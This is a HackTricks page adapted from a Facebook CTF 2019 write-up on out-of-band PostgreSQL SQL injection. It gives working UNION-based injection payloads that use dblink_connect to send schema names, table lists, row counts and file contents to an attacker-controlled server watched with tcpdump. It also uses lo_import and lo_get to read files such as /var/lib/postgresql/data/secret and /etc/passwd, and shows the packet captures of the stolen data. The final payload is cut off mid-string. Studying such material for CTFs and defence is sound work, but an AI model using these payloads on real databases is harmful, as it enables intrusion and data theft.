# dblink/lo\_import data exfiltration

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**This is an example of how to exfiltrate data loading files in the database with `lo_import` and exfiltrate them using `dblink_connect`.**

## Preparing the exfiltration server/Asynchronous SQL Injection

**Extracted from:** [**https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md**](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

Because the `pg_sleep` also doesn't cause delay, we can safely assume if query execution occurs in the background or asynchronously.

Normally, `dblink_connect` can be used to open a persistent connection to a remote PostgreSQL database (e.g. `SELECT dblink_connect('host=HOST user=USER password=PASSWORD dbname=DBNAME')`). Because we can control the parameter of this function, we can perform SQL Server Side Request Forgery to our own host. That means, we can perform Out-of-Band SQL Injection to exfiltrate data from SQL query results. At least, there are two ways to do this:

1. Set up a **DNS server** and then trigger the connection to `[data].our.domain` so that we can see the data in the log or in the DNS network packets.
2. Set up a **public PostgreSQL server, monitor the incoming network packets to PostgreSQL port**, and then trigger a connection to our host with exfiltrated data as `user`/`dbname`. By **default**, PostgreSQL doesn't use SSL for communication so we can see `user`/`dbname` as a **plain-text** on the network.

The **second method is easier** because we don't need any domain. We only need to set up a server with a public IP, install PostgreSQL, set the PostgreSQL service to listen to \*/0.0.0.0, and run a network dumper (e.g. tcpdump) to monitor traffic to the PostgreSQL port (5432 by default).

To set PostgreSQL so that it will **listen to the public**, set `listen_addresses` in `postgresql.conf` to `*`.

```
listen_addresses = '*'
```

To monitor incoming traffic, run `tcpdump` to monitor port 5432.

```
sudo tcpdump -nX -i eth0 port 5432
```

To see if we get a connection from the target, we can try using this query:

```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=farisv password=postgres dbname=hellofromfb')) --
```

If successful, we get a piece of network packet with readable `user` and `dbname`.

```
17:14:11.267060 IP [54.185.163.254.50968] > [REDACTED]: Flags [P.], seq 1:43, ack 1, win 229, options [nop,nop,TS val 970078525 ecr 958693110], length 42
    0x0000:  4500 005e 9417 4000 2706 248c 36b9 a3fe  E..^..@.'.$.6...
    0x0010:  9de6 2259 c718 2061 5889 142a 9f8a cb5d  .."Y...aX..*...]
    0x0020:  8018 00e5 1701 0000 0101 080a 39d2 393d  ............9.9=
    0x0030:  3924 7ef6 0000 002a 0003 0000 7573 6572  9$~....*....user
    0x0040:  0066 6172 6973 7600 6461 7461 6261 7365  .farisv.database
    0x0050:  0068 656c 6c6f 6672 6f6d 6662 0000       .hellofromfb.
```

Then, we can **continue to extract the database using several PostgreSQL queries**. Note that for each query result that contains whitespaces, we need to convert the result to **hex/base64** with `encode` function or replace the whitespace to other character with `replace` function because it will cause an execution error during `dblink_connect` process.

Get a **list** of **schemas**:

```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(schema_name,':') FROM information_schema.schemata) || ' password=postgres dbname=postgres')) --
```

```
17:36:46.538178 IP 54.185.163.254.51018 > [REDACTED]: Flags [P.], seq 1:70, ack 1, win 229, options [nop,nop,TS val 971433789 ecr 960048322], length 69
    0x0000:  4500 0079 ecd5 4000 2706 cbb2 36b9 a3fe  E..y..@.'...6...
    0x0010:  9de6 2259 c74a 2061 1e74 4769 b404 803d  .."Y.J.a.tGi...=
    0x0020:  8018 00e5 2710 0000 0101 080a 39e6 e73d  ....'.......9..=
    0x0030:  3939 2cc2 0000 0045 0003 0000 7573 6572  99,....E....user
    0x0040:  0070 7562 6c69 633a 696e 666f 726d 6174  .public:informat
    0x0050:  696f 6e5f 7363 6865 6d61 3a70 675f 6361  ion_schema:pg_ca
    0x0060:  7461 6c6f 6700 6461 7461 6261 7365 0070  talog.database.p
    0x0070:  6f73 7467 7265 7300 00                   ostgres.
```

Get a **list** of **tables** in current schema:

```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(tablename, ':') FROM pg_catalog.pg_tables WHERE schemaname=current_schema()) || ' password=postgres dbname=postgres')) --
```

```
17:38:30.515438 IP 54.185.163.254.51026 > [REDACTED]: Flags [P.], seq 1:42, ack 1, win 229, options [nop,nop,TS val 971537775 ecr 960152304], length 41
    0x0000:  4500 005d f371 4000 2706 c532 36b9 a3fe  E..].q@.'..26...
    0x0010:  9de6 2259 c752 2061 8dd4 e226 24a3 a5c5  .."Y.R.a...&$...
    0x0020:  8018 00e5 fe2b 0000 0101 080a 39e8 7d6f  .....+......9.}o
    0x0030:  393a c2f0 0000 0029 0003 0000 7573 6572  9:.....)....user
    0x0040:  0073 6561 7263 6865 7300 6461 7461 6261  .searches.databa
    0x0050:  7365 0070 6f73 7467 7265 7300 00         se.postgres.
```

**Count** the **rows** in `searches` table.

```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT COUNT(*) FROM searches) || ' password=postgres dbname=postgres')) --
```

```
17:42:39.511643 IP 54.185.163.254.51034 > [REDACTED]: Flags [P.], seq 1:35, ack 1, win 229, options [nop,nop,TS val 971786760 ecr 960401280], length 34
    0x0000:  4500 0056 7982 4000 2706 3f29 36b9 a3fe  E..Vy.@.'.?)6...
    0x0010:  9de6 2259 c75a 2061 5ec0 7df0 8611 357d  .."Y.Z.a^.}...5}
    0x0020:  8018 00e5 f855 0000 0101 080a 39ec 4a08  .....U......9.J.
    0x0030:  393e 8f80 0000 0022 0003 0000 7573 6572  9>....."....user
    0x0040:  0030 0064 6174 6162 6173 6500 706f 7374  .0.database.post
    0x0050:  6772 6573 0000                           gres.
```

It looks like it only has one empty table in the current schema and the flag is not in the database. We may really need to exfiltrate data from `/var/lib/postgresql/data/secret`. Unfortunately, if we try to use `pg_read_file` or `pg_read_binary_file` to read the file, we will not get an incoming connection so that the current user may not have permission to use these functions.

#### More info of asynchronous SQLInjection with postdresql

* [https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

## **Exfiltrating large object contents**

It's possible to read file using large objects ([https://www.postgresql.org/docs/11/lo-funcs.html](https://www.postgresql.org/docs/11/lo-funcs.html)). We can use `lo_import` to load the contents of the file into the `pg_largeobject` catalog. If the query is success, we will get the object's `oid`.

```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT lo_import('/var/lib/postgresql/data/secret')) || ' password=postgres dbname=postgres')) --
```

```
17:54:51.963925 IP 54.185.163.254.51046 > [REDACTED]: Flags [P.], seq 1:39, ack 1, win 229, options [nop,nop,TS val 972519214 ecr 961133706], length 38
    0x0000:  4500 005a 071f 4000 2706 b188 36b9 a3fe  E..Z..@.'...6...
    0x0010:  9de6 2259 c766 2061 26fb c8a7 bbb3 fe01  .."Y.f.a&.......
    0x0020:  8018 00e5 2272 0000 0101 080a 39f7 772e  ...."r......9.w.
    0x0030:  3949 bc8a 0000 0026 0003 0000 7573 6572  9I.....&....user
    0x0040:  0032 3436 3638 0064 6174 6162 6173 6500  .24668.database.
    0x0050:  706f 7374 6772 6573 0000                 postgres..
```

We got 24668 as `oid` so that means we can use `lo_import` function. Unfortunately, we won't get any results if we try to get the content of large object using `lo_get(24668)` or directly access the `pg_largeobject` catalog. **It looks like the current user doesn't have permission to read the content of new objects.**

After reading the documentation of large objects in PostgreSQL, we can find out that **large objects can has ACL** (Access Control List). That means, if there is an old object with an ACL that allows current user to read it, then we can exfiltrate that object's content.

We can get a list of available large object's `oid` by extracting from `pg_largeobject_metadata`.

```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(cast(l.oid as text), ':') FROM pg_largeobject_metadata l) || ' password=postgres dbname=postgres')) --
```

```
18:06:57.172285 IP 54.185.163.254.51052 > [REDACTED]: Flags [.], seq 1:2897, ack 1, win 229, options [nop,nop,TS val 973244413 ecr 961858878], length 2896
    0x0000:  4500 0b84 7adf 4000 2606 339e 36b9 a3fe  E...z.@.&.3.6...
    0x0010:  9de6 2259 c76c 2061 8d76 e934 10c9 3972  .."Y.l.a.v.4..9r
    0x0020:  8010 00e5 a66d 0000 0101 080a 3a02 87fd  .....m......:...
    0x0030:  3954 cd3e 0000 1c94 0003 0000 7573 6572  9T.>........user
    0x0040:  0031 3635 3731 3a31 3634 3339 3a31 3635  .16571:16439:165
    0x0050:  3732 3a31 3634 3431 3a31 3634 3432 3a31  72:16441:16442:1
    0x0060:  3733 3732 3a31 3634 3434 3a31 3634 3435  7372:16444:16445
    0x0070:  3a31 3831 3534 3a31 3733 3830 3a31 3737  :18154:17380:177
    0x0080:  3038 3a31 3635 3737 3a31 3634 3530 3a31  08:16577:16450:1
    0x0090:  3634 3531 3a31 3634 3532 3a31 3634 3533  6451:16452:16453

.....
.....
.....
```

We got a bunch of `oid`s. We can try using `lo_get` to load object's content. For example, `lo_get(16439)` will load the content of `/etc/passwd`. Because the result of `lo_gets` is `bytea`, we need to convert it to `UTF8` so that it can be appended in the query.

We can try to load some objects with lowest `oid` to find out if the flag file has been loaded before. The flag file object does exist with `oid` 16444. There are no whitespaces in the flag so we can just display it as is.

To load the flag:

```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT convert_from(lo_get(16444), 'UTF8')) || ' password=postgres dbname=p
```

#### More info of oid:

* [https://balsn.tw/ctf\_writeup/20190603-facebookctf/#hr\_admin\_module](https://balsn.tw/ctf\_writeup/20190603-facebookctf/#hr\_admin\_module)
* [https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
